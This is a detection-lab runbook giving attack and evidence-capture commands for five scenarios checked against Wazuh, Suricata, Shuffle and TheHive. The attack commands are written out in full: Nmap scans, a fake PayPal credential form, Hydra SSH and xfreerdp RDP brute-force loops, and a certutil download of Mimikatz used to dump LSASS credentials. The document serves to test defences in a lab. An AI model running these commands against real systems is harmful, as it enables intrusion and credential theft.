# Evidence Capture Commands

Copy-paste commands to grab the proof for each scenario. Run the attack, wait for
the alert, then run the capture command. Screenshots are noted where a command
can't produce the artifact.

> **Before you start:** make sure the Wazuh agent is **Active**
> (`sudo /var/ossec/bin/agent_control -l` on the manager) and, for JSON capture,
> that JSON alert logging is on. If `/var/ossec/logs/alerts/alerts.json` doesn't
> exist, enable it in `ossec.conf` under `<alerts>`:
> `<jsonout_output>yes</jsonout_output>`, then `systemctl restart wazuh-manager`.
>
> `jq` makes the JSON readable: `sudo apt install jq` (manager).

---

## Scenario 01 — Nmap recon (Suricata)

Repeat the three steps for each scan type (`-sS`, `-sV`, `-A`), waiting ~1 minute
between scans. Replace `sS` in the filenames to match.

**1. Mark the log position (target):**
```bash
sudo wc -l /var/log/suricata/fast.log | awk '{print $1}' > ~/n-sS.txt
```

**2. Attack (Kali):**
```bash
# -n = no reverse DNS (Nmap 7.991 aborts in its DNS resolver without it)
sudo nmap -n -sS 192.168.56.20 | tee ~/nmap-sS.txt
```

**3. Capture only this scan's alerts and count them per signature (target, ~30 s later):**
```bash
N=$(cat ~/n-sS.txt)
sudo tail -n +$((N+1)) /var/log/suricata/fast.log | grep "192.168.56.10" > ~/fast-sS.txt
awk -F'\\[\\*\\*\\]' '{print $2}' ~/fast-sS.txt | sort | uniq -c | sort -rn | tee ~/sig-sS.txt
```

An empty `sig-*.txt` is a valid result (no detection). Do **not** use `tail -N` on
`fast.log` — it truncates the scan and hides earlier alerts.

**Check what `HOME_NET` covers (target)** — ET inbound rules only fire on sources
outside it:
```bash
grep -n "HOME_NET:" /etc/suricata/suricata.yaml
```

**Capture the Suricata alert as seen by Wazuh (manager):**
```bash
# Suricata alerts surface under base rule 86601
sudo grep '"id":"86601"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-01-nmap/wazuh-suricata-alert.json
```

**Screenshot:** optional — the dashboard filtered to `rule.groups: ids` →
`evidence/scenario-01-nmap/wazuh-suricata.png`

---

## Scenario 02 — Phishing IOC → SOAR

**Analysis (Kali):**
```bash
mkdir -p evidence/scenario-02-phishing
emlAnalyzer -i ~/paypal_phish.eml --header --html --url --text \
  | tee evidence/scenario-02-phishing/emlanalyzer-output.txt
```

**Serve the fake login page on the lab phishing server (Kali, bound to its own IP):**
```bash
# Add the phishing-server IP to the attack interface (replace eth0 as needed):
sudo ip address add 192.168.56.99/24 dev eth0
# Create the page the link points at. http.server is a STATIC file server rooted at
# the launch dir — without this file the callback returns 404 instead of 200:
mkdir -p ~/phish/paypal/login
cat > ~/phish/paypal/login/verify.php <<'EOF'
<!DOCTYPE html><html><body>
<h2>Account Verification</h2>
<form method="post">Email: <input name="email"><br>
Password: <input name="password" type="password"><br><button>Verify</button></form>
</body></html>
EOF
cd ~/phish && sudo python3 -m http.server 80 --bind 192.168.56.99
```

**Simulated click (target) — a victim host follows the phishing link:**
```bash
curl -m 5 http://192.168.56.99/paypal/login/verify.php
```

**Capture the IOC-match alert (manager) — fires in ~1-2s (http transaction event):**
```bash
sudo grep '"id":"100100"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-02-phishing/wazuh-100100-alert.json
```

**Enrichment capability — labeled synthetic test (target), carries a real known-bad
IP; no traffic is sent to it:**
```bash
TS=$(date -u +%Y-%m-%dT%H:%M:%S.000000+0000)
echo "{\"timestamp\":\"$TS\",\"in_iface\":\"enp0s3\",\"event_type\":\"http\",\"src_ip\":\"192.168.56.20\",\"dest_ip\":\"<known-bad-ip>\",\"dest_port\":80,\"proto\":\"TCP\",\"http\":{\"hostname\":\"<known-bad-ip>\",\"url\":\"/\"},\"lab_note\":\"SYNTHETIC TEST EVENT\"}" \
  | sudo tee -a /var/log/suricata/eve.json
# (add <known-bad-ip>:phishing_infrastructure to the CDB list + restart manager first)
```

**Screenshots (the SOAR half can't be captured by CLI).** The detection JSON `id`,
the Shuffle `$exec.id`, and the TheHive `Reference` must all be the **same** event ID
— that is what makes the chain verifiable.

*Real detection chain (the `.99` callback above):*
- Shuffle workflow run for that event → `evidence/scenario-02-phishing/shuffle-run-real.png`
- TheHive alert, **IOC attached as an observable** → `evidence/scenario-02-phishing/thehive-alert-real.png`
- TheHive observable (`192.168.56.99`) → `evidence/scenario-02-phishing/thehive-observable-real.png`
- (optional) the alert in the Wazuh dashboard → `evidence/scenario-02-phishing/wazuh-100100-discover.png`

*Synthetic enrichment demo (the known-bad-IP event — a separate event):*
- Shuffle run → `evidence/scenario-02-phishing/shuffle-run-synthetic.png`
- TheHive alert (`VT malicious: 20`) → `evidence/scenario-02-phishing/thehive-alert-synthetic.png`
- TheHive observable → `evidence/scenario-02-phishing/thehive-observable-synthetic.png`
- Manual VirusTotal web lookup of the known-bad IP → `evidence/scenario-02-phishing/virustotal-enrichment.png`

---

## Scenario 03 — SSH brute force (+ auto-block)

**One-time setup — the temporary auto-block** (manager `ossec.conf`, inside the
first `<ossec_config>`; the `firewall-drop` command is already defined by default):
```xml
<active-response>
  <command>firewall-drop</command>   <!-- built-in; drops the srcip via iptables -->
  <location>local</location>         <!-- runs on the agent that fired the alert -->
  <rules_id>5712</rules_id>
  <timeout>300</timeout>             <!-- temporary 5-min ban (best practice) -->
</active-response>
```
`sudo systemctl restart wazuh-manager`, then confirm the `active-response queue`
connects cleanly in `ossec.log`.

**Password list (Kali):** a ~25-entry `~/passwords.txt` — a realistic burst, well
above the 5712 threshold of 8.

**Attack (Kali):**
```bash
mkdir -p evidence/scenario-03-ssh
hydra -l fakeuser -P ~/passwords.txt ssh://192.168.56.20 -t 4 -w 5 | tee evidence/scenario-03-ssh/attack-output.txt
```
Once 5712 fires, `firewall-drop` drops `192.168.56.10` and hydra's remaining tries
time out — that's the block working. `Ctrl+C` after it stalls.

**Capture the detection + per-attempt alerts (manager):**
```bash
sudo grep '"id":"5712"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-03-ssh/alert-5712.json
sudo grep '"id":"5710"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-03-ssh/alert-5710.json
```

**Capture the auto-block (manager for the alerts; target for iptables):**
```bash
# the block/unblock active-response alerts (651 add, 652 delete after the timeout)
sudo grep '"id":"651"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-03-ssh/alert-651-block.json
sudo grep '"id":"652"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-03-ssh/alert-652-unblock.json
# on the TARGET (192.168.56.20): the AR log + the live iptables DROP. Check promptly,
# before the 300s timeout removes it; save both into active-response-block.txt
sudo grep firewall-drop /var/ossec/logs/active-responses.log | tail -8
sudo iptables -L -n | grep 192.168.56.10
```

**Screenshots:**
- Wazuh Discover filtered to the 5712 → `evidence/scenario-03-ssh/wazuh-5712-alerts.png`
- that alert expanded (`frequency`, `srcip`, `srcuser`, MITRE) → `evidence/scenario-03-ssh/wazuh-5712-detail.png`
- the Shuffle run for the event → `evidence/scenario-03-ssh/shuffle-aggregated.png`
- the TheHive case (`Reference` = the 5712 event id) → `evidence/scenario-03-ssh/thehive-alert.png`
- the TheHive observable (attacker IP) → `evidence/scenario-03-ssh/thehive-observable.png`

---

## Scenario 04 — RDP brute force → lockout → interactive session

**Attack, part 1 — brute force until lockout (Kali).** `+auth-only` does the NLA
credential check only (a Type-3 logon), so each wrong password is a clean 4625:
```bash
mkdir -p evidence/scenario-04-rdp
for pass in $(cat ~/winpass.txt); do
  echo "=== Trying: $pass ==="
  xfreerdp3 /u:Client /p:"$pass" /v:192.168.56.30 /cert:ignore +auth-only
done 2>&1 | tee evidence/scenario-04-rdp/attack-output.txt
```

**Attack, part 2 — clear the lockout, then open a REAL session (Windows / Kali).**
The lockout stops the loop (every further try, even the correct one, returns
`ACCOUNT_LOCKED_OUT`). Policy is 10/10/10, so in the wild you wait 10 min; in the lab
clear it with ADSI, then RDP in interactively with the known-good password:
```powershell
# On Windows: clear the lockout (net user does NOT clear it — use ADSI)
$u = [ADSI]"WinNT://$env:COMPUTERNAME/Client,user"; $u.IsAccountLocked = $false; $u.SetInfo()
```
```bash
# On Kali: a real interactive RDP session (no +auth-only) → Type-10 logon
xfreerdp3 /u:Client /p:"<known-good>" /v:192.168.56.30 /cert:ignore -clipboard
```

**Capture the alerts (manager).** The successful RDP login records two 4624s — a
Type-3 NLA pre-auth (92657) and a Type-10 interactive session (92653):
```bash
# account lockout (60115, EID 4740)
sudo grep '"id":"60115"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-04-rdp/alert-60115-lockout.json
# the successful NLA pre-auth — Type 3 (92657, the forwarded headline)
sudo grep '"id":"92657"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-04-rdp/alert-92657-type3-nla.json
# the genuine interactive RDP session — Type 10 (92653, supporting evidence)
sudo grep '"id":"92653"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-04-rdp/alert-92653-type10-session.json
```
```bash
# a failed logon co-located with the lockout burst (60122). tail -1 can grab a
# stray later failure; scope by event id below the lockout's id to stay in the burst
LOCK=$(jq -r .id evidence/scenario-04-rdp/alert-60115-lockout.json)
sudo jq -c "select(.rule.id==\"60122\" and (.id|tonumber < ($LOCK|tonumber)+2))" \
  /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-04-rdp/alert-60122-failure.json
```

**Screenshots:**
- Wazuh Discover, the full arc filtered to `rule.id:(60122 or 60115 or 92657 or 92653)`
  and `targetUserName: Client` → `evidence/scenario-04-rdp/wazuh-rdp-sequence.png`
- Shuffle runs for the lockout and the logon →
  `shuffle-rdp-lockout.png`, `shuffle-rdp-compromise.png`
- TheHive alerts (lockout `Reference` = 60115 id; logon `Reference` = 92657 id) →
  `thehive-lockout.png`, `thehive-compromise.png`

---

## Scenario 05 — Credential dumping (Mimikatz / LSASS)

**Attack (Windows, in the compromised session; tool served from Kali with
`python3 -m http.server 80`):**
```powershell
# fetch the tool, renamed on disk to prove detection isn't name-based
certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
# dump credentials from LSASS
C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Capture all three alerts (manager).** All fired live in one pass: certutil ingress
transfer (92075), the behavioral LSASS read (92900, forwarded), and the name-based
Mimikatz match (100002):
```bash
mkdir -p evidence/scenario-05-creddump
# behavioral LSASS access — the forwarded headline (92900, EID 10, T1003.001)
sudo grep '"id":"92900"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-05-creddump/alert-92900-lsass.json
# name-based Mimikatz by PE OriginalFileName (100002, EID 1, T1003)
sudo grep '"id":"100002"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-05-creddump/alert-100002-mimikatz.json
# certutil ingress tool transfer (92075, EID 1, T1105)
sudo grep '"id":"92075"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-05-creddump/alert-92075-certutil.json
```

**Screenshots:** the 92900 alert list and the detail showing
`sourceImage: m.exe → targetImage: lsass.exe`, `grantedAccess: 0x1010`, and MITRE
T1003.001 (`wazuh-92900-alerts.png`, `wazuh-92900-detail.png`), plus the Shuffle run
and the TheHive alert (`shuffle-creddump.png`, `thehive-creddump.png`) →
`evidence/scenario-05-creddump/`.

---

## Redaction reminder

Before committing, scrub any public cloud IPs or credentials from the captured
files:

```bash
# dry-run: see what would match
grep -rInE "159\.203\.|142\.93\.|password|api[_-]?key|token" evidence/
```

Replace real cloud IPs with `<MANAGER_IP>` / `<THEHIVE_IP>` in any captured JSON
before publishing.
